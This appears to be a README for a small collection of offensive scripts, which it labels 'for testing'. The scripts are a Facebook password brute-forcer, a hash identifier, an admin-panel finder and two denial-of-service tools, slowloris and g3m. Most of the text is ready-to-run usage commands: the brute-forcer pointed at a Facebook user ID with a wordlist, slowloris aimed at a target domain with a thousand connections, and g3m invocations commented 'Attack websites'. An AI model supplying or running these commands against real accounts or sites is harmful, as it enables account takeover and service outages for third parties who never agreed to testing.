# Scripts for testing.

* fb-brute.pl = Bruteforce for Facebook
* hash_id_v1.1.py = Hash Identifier
* painel.pl = Admin Control Panel Finder
* slowloris.pl = Denial of Service
* g3m = Denial of Service

How to Install and use
----

`fb-brute.pl`
```sh
$ sudo chmod +x fb-brute.pl
$ perl fb-brute.pl id-user-facebook wordlist.txt
```

`hash_id_v1.1.py`
```sh
$ sudo chmod +x hash_id_v1.1.py
$ python2 hash_id_v1.1.py
``` 

`painel.pl`
```sh
$ sudo chmod +x painel.pl
$ perl painel.pl
```

`slowloris.pl`
```sh
$ sudo chmod +x slowloris.pl
$ perl slowloris.pl -dns www.target.com -port 80 -timeout 1 -num 1000 -tcpto 5
$ perl slowloris.pl -dns IP
```

`g3m`
```sh
$ sudo chmod +x g3m
$ ./g3m -h ip -T 3              #Attack private internet
$ ./g3m -h ip -T 3 -p 80,80     #Attack websites
```
